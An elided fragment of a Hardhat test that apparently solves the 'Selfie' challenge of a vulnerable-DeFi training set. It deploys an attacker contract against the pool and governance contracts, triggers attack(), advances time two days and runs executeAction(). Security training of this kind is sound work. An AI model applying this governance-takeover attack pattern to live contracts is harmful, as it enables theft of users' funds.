...
describe("[Challenge] Selfie", function () {
	...
	it("Exploit", async function () {
		...
		const Attack = await ethers.getContractFactory("attackSelfie", attacker);
		this.att = await Attack.deploy(
			this.pool.address,
			this.token.address,
			this.governance.address
		);

		await expect(this.att.connect(attacker).attack()).to.not.be.reverted;

		await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 2 days
		await expect(this.att.connect(attacker).executeAction()).to.not.be.reverted;
	});
